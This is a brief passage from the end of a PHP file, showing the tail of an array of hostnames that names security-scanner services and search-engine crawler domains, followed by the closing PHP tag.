k.','sucuri.net','trendmicro.com','web7.admin.sat.wordpress.com','wssa.beyondsecurity.com','amazonaws.com','ask.com','crawl.yahoo.net','duckduckgo.com','googlebot.com','search.msn.com');

?>
